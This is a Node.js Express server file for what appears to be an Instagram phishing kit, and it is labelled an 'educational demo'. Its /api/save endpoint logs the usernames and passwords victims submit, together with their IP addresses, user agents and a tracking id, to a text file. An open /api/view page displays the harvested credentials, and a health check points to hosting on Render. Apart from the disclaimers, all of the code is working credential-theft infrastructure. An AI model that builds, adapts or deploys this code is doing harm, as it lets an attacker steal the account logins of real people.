const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const helmet = require('helmet');

const app = express();
const PORT = process.env.PORT || 3000;

// Security middleware (relaxed for educational demo)
app.use(helmet({
    contentSecurityPolicy: false, // Disable for demo to allow inline scripts
}));
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files from 'public' directory
app.use(express.static('public'));

// Path to the data file
const DATA_FILE = path.join(__dirname, 'captured_data.txt');

// Initialize data file if it doesn't exist
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, '=== INSTAGRAM SIMULATION LOG ===\n');
    fs.appendFileSync(DATA_FILE, `=== Started: ${new Date().toISOString()} ===\n\n`);
}

// ==================== API ENDPOINTS ====================

// 1. Save captured credentials
app.post('/api/save', (req, res) => {
    const { username, password, rid, userAgent, ip } = req.body;

    // Get client info
    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown IP';
    const clientUA = req.headers['user-agent'] || 'Unknown User-Agent';

    // Create log entry
    const timestamp = new Date().toISOString();
    const logEntry = [
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
        `🕐 Timestamp: ${timestamp}`,
        `📍 IP Address: ${clientIP}`,
        `💻 User Agent: ${clientUA}`,
        `🔑 RID: ${rid || 'N/A'}`,
        `👤 Username: ${username || 'N/A'}`,
        `🔒 Password: ${password || 'N/A'}`,
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`
    ].join('\n');

    // Append to file
    fs.appendFile(DATA_FILE, logEntry, (err) => {
        if (err) {
            console.error('❌ Error saving to file:', err);
            return res.status(500).json({
                success: false,
                error: 'Failed to save credentials',
                details: err.message
            });
        }

        console.log(`✅ Credentials saved: ${username} (${timestamp})`);
        res.json({
            success: true,
            message: 'Credentials saved successfully',
            timestamp: timestamp
        });
    });
});

// 2. View captured data (for demo/educational purposes)
app.get('/api/view', (req, res) => {
    fs.readFile(DATA_FILE, 'utf8', (err, data) => {
        if (err) {
            return res.status(404).send(`
        <html>
          <head><title>No Data</title></head>
          <body style="font-family: monospace; padding: 20px;">
            <h1>📭 No data captured yet</h1>
            <p>The data file hasn't been created or is empty.</p>
          </body>
        </html>
      `);
        }

        res.send(`
      <!DOCTYPE html>
      <html>
        <head>
          <title>Captured Data - Educational Demo</title>
          <style>
            body { 
              font-family: 'Courier New', monospace; 
              background: #0a0a0a; 
              color: #00ff00; 
              padding: 20px;
              margin: 0;
            }
            .container {
              max-width: 900px;
              margin: 0 auto;
              background: #1a1a1a;
              padding: 20px;
              border-radius: 8px;
              border: 1px solid #333;
            }
            h1 { 
              color: #ff6b6b; 
              border-bottom: 2px solid #333;
              padding-bottom: 10px;
            }
            pre { 
              white-space: pre-wrap; 
              word-wrap: break-word;
              background: #0a0a0a;
              padding: 15px;
              border-radius: 4px;
              border: 1px solid #333;
              color: #00ff00;
              line-height: 1.6;
            }
            .warning {
              background: #ff6b6b22;
              border: 1px solid #ff6b6b;
              color: #ff6b6b;
              padding: 10px;
              border-radius: 4px;
              margin: 20px 0;
            }
            .footer {
              margin-top: 20px;
              color: #666;
              text-align: center;
              font-size: 12px;
            }
            .clear-btn {
              background: #ff6b6b;
              color: white;
              border: none;
              padding: 10px 20px;
              border-radius: 4px;
              cursor: pointer;
              margin-top: 10px;
              font-weight: bold;
            }
            .clear-btn:hover {
              background: #ff5252;
            }
            .refresh-btn {
              background: #4a4a4a;
              color: white;
              border: none;
              padding: 10px 20px;
              border-radius: 4px;
              cursor: pointer;
              margin-top: 10px;
              margin-left: 10px;
            }
            .refresh-btn:hover {
              background: #5a5a5a;
            }
          </style>
        </head>
        <body>
          <div class="container">
            <h1>🔐 Captured Credentials (Educational Demo)</h1>
            <div class="warning">
              ⚠️ <strong>WARNING:</strong> This page shows captured login credentials for educational purposes only.
              Do not use this for malicious activities.
            </div>
            <pre>${data}</pre>
            <div style="margin-top: 20px;">
              <button class="clear-btn" onclick="clearData()">🗑️ Clear All Data</button>
              <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
            </div>
            <div class="footer">
              <p>Data saved to: <strong>captured_data.txt</strong></p>
              <p>${new Date().toLocaleString()}</p>
            </div>
          </div>
          <script>
            async function clearData() {
              if (confirm('⚠️ Are you sure you want to delete all captured data?')) {
                try {
                  const response = await fetch('/api/clear', { method: 'POST' });
                  const result = await response.json();
                  if (result.success) {
                    alert('✅ Data cleared successfully!');
                    location.reload();
                  } else {
                    alert('❌ Failed to clear data: ' + result.error);
                  }
                } catch (error) {
                  alert('❌ Error: ' + error.message);
                }
              }
            }
          </script>
        </body>
      </html>
    `);
    });
});

// 3. Clear all captured data (for demo management)
app.post('/api/clear', (req, res) => {
    fs.writeFile(DATA_FILE, `=== INSTAGRAM SIMULATION LOG ===\n=== Reset: ${new Date().toISOString()} ===\n\n`, (err) => {
        if (err) {
            return res.status(500).json({
                success: false,
                error: 'Failed to clear data'
            });
        }
        console.log('🗑️ All data cleared');
        res.json({
            success: true,
            message: 'Data cleared successfully'
        });
    });
});

// 4. Health check endpoint (for Render)
app.get('/health', (req, res) => {
    res.json({
        status: 'OK',
        timestamp: new Date().toISOString(),
        dataFile: DATA_FILE,
        fileExists: fs.existsSync(DATA_FILE)
    });
});

// ==================== FALLBACK ROUTE ====================
// Serve index.html for any unmatched routes (SPA support)
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ==================== START SERVER ====================
app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📁 Data file: ${DATA_FILE}`);
    console.log(`📊 View captured data at: http://localhost:${PORT}/api/view`);
    console.log(`✅ Ready to accept credentials`);
});